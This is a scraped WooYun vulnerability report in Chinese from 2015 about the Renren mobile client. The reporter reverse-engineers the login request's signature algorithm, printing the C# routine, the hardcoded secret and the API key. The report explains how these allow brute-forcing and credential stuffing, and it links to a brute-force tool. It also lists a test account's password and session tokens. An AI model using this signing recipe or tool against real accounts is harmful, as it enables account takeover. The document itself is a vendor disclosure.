{"id": 37691, "wybug_id": "wooyun-2015-0106692", "wybug_title": "逆向人人客户端，破解校验算法之&lt;暴力破解+撞库&gt;", "wybug_corp": "人人网", "wybug_author": "小手冰凉", "wybug_date": "2015-04-09 12:00", "wybug_open_date": "2015-05-24 13:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向公众公开  简要描述： 逆向人人客户端，破解校验算法之<暴力破解+撞库>这是多年之前的发现了，写出来纪念那些日子，纪念那些被我爆破过的过客。。。。。 详细说明：  正常登陆人人，进行抓包，发现了比较多的字段\nurl：http://api.m.renren.com/api字段：method  \t固定值\t\tclient.loginclient_info\t手机信息\tgz\t\t固定值\t\tcompressionv\t\t固定值\t\t1.0format\t\t固定值\t\tJSONuniq_id\t\t固定值\t\t000000000000000api_key\t\t固定值\t\t8b281811f80c471c8d337f5434dd5708（官方从这里应该能查出软件版本）user\t\t用户邮箱password\t用户密码\tmd5加密call_id\t\t时间戳sig\t\t校验字段\n从上面不难看出除了sig这个字段之外其他都好说，产生数据后进行提交发现产生异常提示sig字段不正确。现在没办法只能逆向去计算这个sig值到底怎么计算出来的。具体过程比较复杂最后逆向出如下\nparas.Sort(new ParameterComparer());//paras为提交的所有字段的键值名和键值对，先进行排序StringBuilder sbList = new StringBuilder();foreach (APIParameter para in paras){\tstring temp = para.Name + \"=\" + para.Value;//将每个排序后的键值名和键值对进行排序之后按照这个格式进行拼接起来\tif (temp.Length >= 62)//如果单个字符串超过62位要进行截取。这里简直要了我的老命，调试了一天才弄对\t\t\t\t\t\tsbList.Append(temp.Substring(0, 62));\telse\t\tsbList.Append(temp);}sbList.Append(\"91c82b04d85549e3af738a0ad605ab95\");//最后在字符串结尾拼接上这个字符串，据估计这个应该是带有版本信息的hashsig = HttpUtil.MD5Encrpt(sbList.ToString());//最后计算md5就得到了sig\n按照这个方法再提交就能正常了，然后分析范围值，来确定密码时候正确，这里注意即使出现error_code 10000 密码仍然是正确的。危害是可以进行暴力破解，当然也可以搞现在流行的撞库。以上是大约两年前发现的问题，现在测试仍然存在，当时写了一个暴力破解程序，附在后面。请使用测试程序进行测试，源码都在里面。因为是vs的项目文件太多，只能百度云共享，厂家验证后如果感觉不合适请及时通知我取消分享   漏洞证明：  用我自己的账号进行测试爆破，我把自己的密码放在最后。\n\n\n\n效率的话是代码写的比较久了 当时也不回优化。下面是使用刚申请的账号进行测试。\n用户名：kefcjmqy@mail.bccto.me 密码：kefcjmqy\n随便生成2000个不正确的密码。然后把正确密码分别放在最后和最前面，测试结果如下\n\n如上可以看出一共两次爆破出正确密码\n68\tkefcjmqy\tjieya:{\"session_key\":\"t2dwompKw2BslD3k\",\"ticket\":\"0q2rVlw2HkZP6wNIEk6cd3\",\"uid\":872836293,\"secret_key\":\"783916370cb7c7d40e80169f01b54603\",\"user_name\":\"玩啊啊\",\"head_url\":\"http://a.xnimg.cn/wap/figure/head100.png\",\"now\":1428551073258,\"login_count\":1,\"fill_stage\":0,\"is_guide\":1,\"vip_url\":\"http://i.renren.com/client/icon?uid=\",\"vip_icon_url\":\"\",\"web_ticket\":\"05e2d659b7527c8abe96680c85f932933\",\"uniq_key\":\"197eab97f9b154ad26ceea0a586c322c\"}\n这是第一次，是在第68个破解时正确\n2115\tkefcjmqy\tjieya:{\"error_code\":10000,\"error_msg\":\"登录失败，请重试\"}\n如上面所说返回\"error_code\":10000也是密码正确，这次是第2115次爆破。   修复方案：  禁用老版本的应用次数过滤等建议把校验算法等比较关键的东西写入jni中，提高逆向的门槛链接: http://pan.baidu.com/s/1pJBPwc7 密码: uqg3如果有问题请私信我，如果感觉不合适请私信我关闭分享   版权声明：转载请注明来源 小手冰凉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-04-09 13:55 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-09 12:02 |    \t\t大物期末不能挂 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:23        | 1.一个学渣，只求每门都不挂2.想把漏洞提...)\t\t \n  这是多年之前的发现了，写出来纪念那些日子，纪念那些被我爆破过的过客。。。。。    \n     2015-04-09 13:41 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  这是多年之前的发现了，写出来纪念那些日子，纪念那些被我爆破过的过客。。。。。     \n     2015-04-09 14:06 |    \t\t我能拒绝么 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 疯爆志林)\t\t \n  这是多年之前的发现了，写出来纪念那些日子，纪念那些被我爆破过的过客。。。。。     \n     2015-04-09 15:13 |    \t\tNullun \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | ‮‮nullun‮)\t\t \n  乌云榜第二了。。。。。。求方法    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}